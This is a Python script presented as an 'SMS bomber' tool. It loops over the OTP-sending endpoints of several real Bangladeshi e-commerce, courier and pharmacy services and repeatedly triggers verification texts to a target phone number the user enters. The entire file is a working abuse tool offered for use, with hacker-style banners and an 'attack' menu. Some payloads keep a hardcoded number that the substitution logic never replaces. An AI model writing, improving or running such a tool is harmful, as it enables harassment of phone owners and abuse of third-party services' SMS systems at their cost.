import requests
import os
import sys
import time
from random import choice  # Ensure this imports correctly

# Define color codes for styling
W = '\033[0m'   # White (default)
R = '\033[31m'  # Red
G = '\033[32m'  # Green
Y = '\033[33m'  # Yellow
B = '\033[34m'  # Blue
P = '\033[35m'  # Purple
C = '\033[36m'  # Cyan
LG = '\033[92m' # Light Green

# Stylish ASCII Logo
LOGO = f"""
{R}██╗  ██╗ █████╗  ██████╗███████╗███████╗███████╗
██║  ██║██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝
███████║███████║██║     █████╗  █████╗  █████╗  
██╔══██║██╔══██║██║     ██╔══╝  ██╔══╝  ██╔══╝  
██║  ██║██║  ██║╚██████╗███████╗██║     ██║     
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝     ╚═╝     
{P}[ XVSOULX SMS BOMBER TOOL v3.0 ]{W}
"""

OWNER_INFO = f"""
{C}[+] Author: LEGEND (XVSOULX)
[+] GitHub: ZUYANx
[+] Contact: 01837478901
"""

LINE = f"{Y}{'='*60}{W}"

# Random hacker quotes
QUOTES = [
    f"{G}Connecting to the matrix...{W}",
    f"{R}Breaching mainframe...{W}",
    f"{C}Encrypting payload...{W}",
    f"{LG}Spawning cyber attack...{W}",
    f"{Y}Zeroing target locks...{W}"
]

# Animated text effect
def animate_text(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

# Animated progress bar
def progress_bar(task):
    animate_text(f"{B}[{task}]{W}")
    for i in range(20):
        time.sleep(0.1)
        sys.stdout.write(f"{G}■{W}")
        sys.stdout.flush()
    print("\n")

# Loading effect
def loading_effect(message):
    print(f"{C}[{message}]", end="")
    for _ in range(3):
        time.sleep(0.5)
        print(f"{G}.{W}", end="")
    print("\n")

# API List with URLs, Payloads, and Headers
apis = [
    {"method": "GET", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "payload": {"phone": "01837478901"}, "headers": {}},
    {"method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "payload": {"phoneNumber": "01837478901"}, "headers": {}},
    {"method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "payload": {"phoneNo": "01837478901"}, "headers": {}},
    {"method": "GET", "url": "https://api.medeasy.health/api/send-otp/+8801837478901/", "payload": {}, "headers": {}},
    {"method": "POST", "url": "https://api.osudkini.com/api/otp/generate-otp", "payload": {"phone": "01837478901"}, "headers": {}},
    {"method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=131.0.0.0&os=Android&osv=10&refPartner=", "payload": {"mobile": "+8801837478901", "fcmToken": "", "referral": ""}, "headers": {}},
    {"method": "POST", "url": "https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister", "payload": {"phone": "01837478901"}, "headers": {}},
]

# Function to display the main menu
def menu():
    os.system("clear" if os.name == "posix" else "cls")
    print(LOGO)
    print(OWNER_INFO)
    print(LINE)
    print(f"{G}[1] Start SMS Bombing")
    print(f"{R}[2] Exit")
    print(LINE)
    return input(f"{Y}Enter your choice: {W}")

# Function to call an API
def call_api(api):
    try:
        if api["method"] == "POST":
            response = requests.post(api["url"], json=api["payload"], headers=api["headers"])
        elif api["method"] == "GET":
            response = requests.get(api["url"], headers=api["headers"], params=api["payload"])
        else:
            return "fail"

        if response.status_code in [200, 201]:
            print(f"{G}[✔] Success: {api['url']}{W}")
            return "success"
        else:
            print(f"{R}[✘] Fail: {api['url']} (Status: {response.status_code}){W}")
            return "fail"
    except Exception as e:
        print(f"{R}[!] Error: {api['url']} - {e}{W}")
        return "fail"

# Main function
def main():
    while True:
        choice_input = menu()
        if choice_input == "1":
            phone_number = input(f"{Y}Enter target phone number (e.g., 01875846846): {W}")
            try:
                limit = int(input(f"{Y}Enter the number of times to call the APIs 100: {W}"))
            except ValueError:
                print(f"{R}[!] Invalid input. Please enter a valid number.{W}")
                continue

            success_count, fail_count = 0, 0

            # Update phone numbers dynamically in payload and URL
            for api in apis:
                if "phone" in api["payload"]:
                    api["payload"]["phone"] = phone_number
                if "mobile" in api["payload"]:
                    api["payload"]["mobile"] = f"+88{phone_number}"
                if "url" in api and "{phone}" in api["url"]:
                    api["url"] = api["url"].replace("{phone}", phone_number)

            loading_effect(choice(QUOTES))
            progress_bar("Launching Attack")

            # Call APIs up to the specified limit
            for _ in range(limit):
                for api in apis:
                    result = call_api(api)
                    if result == "success":
                        success_count += 1
                    else:
                        fail_count += 1

            print(LINE)
            print(f"{G}[✔] Total Success: {success_count}{W}")
            print(f"{R}[✘] Total Fail: {fail_count}{W}")
            print(LINE)

            input(f"{C}Press Enter to return to the menu...{W}")
        elif choice_input == "2":
            print(f"{G}[✔] Exiting...{W}")
            sys.exit()
        else:
            print(f"{R}[!] Invalid choice. Try again.{W}")

if __name__ == "__main__":
    main()
